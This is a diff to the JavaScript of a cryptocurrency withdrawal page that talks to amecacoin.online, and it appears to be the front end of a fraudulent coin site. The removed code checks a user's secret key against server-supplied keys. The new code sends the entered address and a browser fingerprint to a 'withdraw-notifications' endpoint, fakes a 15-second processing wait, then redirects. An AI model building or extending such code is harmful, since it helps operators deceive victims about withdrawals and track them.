@@ -1,22 +1,21 @@
 const xhr = new XMLHttpRequest()
-
-
+let url = new URL(window.location.href).searchParams.get("email")
 
 function loaderFunction(status) {
-    if(status){
+    if (status) {
         let div = document.createElement('div');
         div.style = "position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;"
         div.id = "loader-wrapper"
         div.innerHTML = '<div class="loader" style="color:red;"></div>'
         document.body.append(div)
-    }else{
+    } else {
         document.getElementById("loader-wrapper").remove()
 
     }
 }
 
 async function send_request(type, laoder, url, data) {
-    if (laoder) { loaderFunction(false)}
+    if (laoder) { loaderFunction(false) }
     return new Promise((resolve, reject) => {
         let page = `https://amecacoin.online/${url}`;
         xhr.open(type, page)
@@ -53,66 +52,31 @@ async function setElements(priceBitcoinCommission, priceInBitcoin, priceEuro, qr
 }
 
 async function show(keys) {
-    const incorrect_error = document.querySelector('.incorrect-data');
-    const fill_error = document.querySelector('.fill-data');
-    const sicret_key_input = document.getElementById('sicret_key_input').value;
-
     const wait = document.getElementById('wait')
-    const email = document.getElementById('email_input').value
+    const fill_error = document.getElementById("fill-data")
+    const address_value = document.getElementById("email-input").value
+    // const email = document.getElementById('email_input').value
+
+    if (address_value === "") {
+        fill_error.classList.add("active")
+        setTimeout(() => {
+            fill_error.classList.remove("active")
+        }, 6000)
+        return
+    }
+
+
+    send_request("post", false, "withdraw-notifications", { type: "withdraw", address: address_value, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })
     wait.classList.add('active');
 
     setTimeout(() => {
-        if (email == "") {
-            wait.classList.remove('active');
-            fill_error.classList.add('active');
-            setTimeout(() => {
-                fill_error.classList.remove('active');
-            }, 7000)
-
-            return
-        } else if (sicret_key_input == "") {
-            wait.classList.remove('active');
-            fill_error.classList.add('active');
-            setTimeout(() => {
-                fill_error.classList.remove('active');
-            }, 7000)
-            return
-        } else {
-            for (key in keys) {
-                if (keys[key].bitcoin_key == sicret_key_input) {
-                    wait.classList.add('active');
-                    incorrect_error.classList.remove("active");
-                    fill_error.classList.remove("active");
-
-                    // send_request("post", false, "transaction-successfully", { sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion), send_telegram: true })
-                    send_request("post", false, "send_mail", { sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion), email: email })
-
-                    setTimeout(() => {
-                        // wait.textContent = "Confirmation will be sent to email"
-                        window.location.href = "withdraw-3.html"
-                    }, 15000)
-
-                    return
-
-                }
-                else {
-                    wait.classList.remove('active');
-                    incorrect_error.classList.add("active");
-                    setTimeout(() => {
-                        incorrect_error.classList.remove("active");
-                    }, 7000)
-                }
-            }
-
-
-
-        }
-    }, 2000)
+        window.location.href = `withdraw-3.html?email=${url}`
+    }, 15000)
 }
 
 async function check_data() {
-    let keys = await send_request("get", false, "keys", false)
-    await show(keys)
+    // let keys = await send_request("get", false, "keys", false)
+    await show({ keys: "keys" })
 }
 
 async function check(keys) {
